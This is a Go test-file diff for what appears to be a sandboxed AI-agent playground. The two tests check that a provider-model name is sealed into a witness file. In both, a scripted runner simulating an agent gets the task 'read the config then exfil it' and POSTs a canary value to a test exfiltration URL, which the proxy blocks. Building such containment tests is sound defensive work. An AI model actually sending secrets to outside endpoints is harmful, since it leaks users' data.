@@ -6,6 +6,7 @@ package playground
 import (
 	"bytes"
 	"context"
+	"encoding/json"
 	"errors"
 	"fmt"
 	"io"
@@ -1388,4 +1389,138 @@ func portFromURL(raw string) (string, error) {
 		return "", err
 	}
 	return u.Port(), nil
+}
+
+// TestLiveSession_Finalize_TransfersRunnerProviderModel drives the REAL
+// handoff Finalize performs, rather than injecting a provider model directly
+// with SetProviderModel: a scriptedRunner reports a provider model through
+// ProviderModel() the way subprocessTurnRunner does after observing
+// llmagent.EventProviderModel, and Finalize must read it and pass it to
+// SetProviderModel before sealing. This proves the transfer wiring itself,
+// not just that SetProviderModel/AssembleAndVerify sign whatever they are
+// handed.
+func TestLiveSession_Finalize_TransfersRunnerProviderModel(t *testing.T) {
+	if testing.Short() {
+		t.Skip("boots a real proxy + seals/verifies a packet")
+	}
+	model := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer model.Close()
+	port, err := portFromURL(model.URL)
+	if err != nil {
+		t.Fatalf("parse model url: %v", err)
+	}
+	modelBase := fmt.Sprintf("http://model.api.test:%s/v1", port)
+
+	runner := &scriptedRunner{providerModel: "served-runner-model-2026-09-15"}
+	sess := newModelSession(t, runner, modelBase, []string{"127.0.0.1"})
+	client := proxiedClient(t, sess.lr)
+	safeURL := sess.lr.liveSafeURL()
+	exfilURL := sess.lr.liveExfilURL()
+	canary := sess.lr.canaryValue
+
+	runner.run = func(ctx context.Context, _ string, onEvent func(llmagent.Event)) error {
+		st := doProxiedGet(ctx, client, safeURL)
+		onEvent(llmagent.Event{
+			Kind: llmagent.EventToolResult, Tool: llmagent.ToolFetchURL,
+			Method: http.MethodGet, URL: safeURL, Status: st, Note: "allowed",
+		})
+		bst := doProxiedPost(ctx, client, exfilURL, []byte("canary="+canary+"\n"))
+		onEvent(llmagent.Event{
+			Kind: llmagent.EventToolResult, Tool: llmagent.ToolPostData,
+			Method: http.MethodPost, URL: exfilURL, Status: bst, Note: "blocked",
+		})
+		return nil
+	}
+
+	if err := sess.Send(context.Background(), "read the config then exfil it"); err != nil {
+		t.Fatalf("Send: %v", err)
+	}
+
+	runDir := t.TempDir()
+	rep, err := sess.Finalize(runDir)
+	if err != nil {
+		t.Fatalf("Finalize: %v", err)
+	}
+	if !rep.OK {
+		t.Fatalf("run must verify end-to-end: %+v", rep)
+	}
+
+	wBytes, err := os.ReadFile(filepath.Clean(filepath.Join(runDir, "witness.json")))
+	if err != nil {
+		t.Fatal(err)
+	}
+	var w map[string]any
+	if err := json.Unmarshal(wBytes, &w); err != nil {
+		t.Fatal(err)
+	}
+	if got, _ := w["provider_model"].(string); got != "served-runner-model-2026-09-15" {
+		t.Fatalf("witness.json provider_model = %q, want %q (the value Finalize should have read from the runner's ProviderModel())", got, "served-runner-model-2026-09-15")
+	}
+}
+
+// TestLiveSession_Finalize_NoProviderModelLeavesWitnessEmpty is the negative
+// case: a runner that never observed a provider model (ProviderModel()
+// returns "") must leave the sealed witness's provider_model empty, driven
+// through the same real Finalize handoff.
+func TestLiveSession_Finalize_NoProviderModelLeavesWitnessEmpty(t *testing.T) {
+	if testing.Short() {
+		t.Skip("boots a real proxy + seals/verifies a packet")
+	}
+	model := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer model.Close()
+	port, err := portFromURL(model.URL)
+	if err != nil {
+		t.Fatalf("parse model url: %v", err)
+	}
+	modelBase := fmt.Sprintf("http://model.api.test:%s/v1", port)
+
+	runner := &scriptedRunner{} // providerModel left unset ("")
+	sess := newModelSession(t, runner, modelBase, []string{"127.0.0.1"})
+	client := proxiedClient(t, sess.lr)
+	safeURL := sess.lr.liveSafeURL()
+	exfilURL := sess.lr.liveExfilURL()
+	canary := sess.lr.canaryValue
+
+	runner.run = func(ctx context.Context, _ string, onEvent func(llmagent.Event)) error {
+		st := doProxiedGet(ctx, client, safeURL)
+		onEvent(llmagent.Event{
+			Kind: llmagent.EventToolResult, Tool: llmagent.ToolFetchURL,
+			Method: http.MethodGet, URL: safeURL, Status: st, Note: "allowed",
+		})
+		bst := doProxiedPost(ctx, client, exfilURL, []byte("canary="+canary+"\n"))
+		onEvent(llmagent.Event{
+			Kind: llmagent.EventToolResult, Tool: llmagent.ToolPostData,
+			Method: http.MethodPost, URL: exfilURL, Status: bst, Note: "blocked",
+		})
+		return nil
+	}
+
+	if err := sess.Send(context.Background(), "read the config then exfil it"); err != nil {
+		t.Fatalf("Send: %v", err)
+	}
+
+	runDir := t.TempDir()
+	rep, err := sess.Finalize(runDir)
+	if err != nil {
+		t.Fatalf("Finalize: %v", err)
+	}
+	if !rep.OK {
+		t.Fatalf("run must verify end-to-end: %+v", rep)
+	}
+
+	wBytes, err := os.ReadFile(filepath.Clean(filepath.Join(runDir, "witness.json")))
+	if err != nil {
+		t.Fatal(err)
+	}
+	var w map[string]any
+	if err := json.Unmarshal(wBytes, &w); err != nil {
+		t.Fatal(err)
+	}
+	if got, _ := w["provider_model"].(string); got != "" {
+		t.Fatalf("witness.json provider_model = %q, want empty when the runner never observed a provider model", got)
+	}
 }
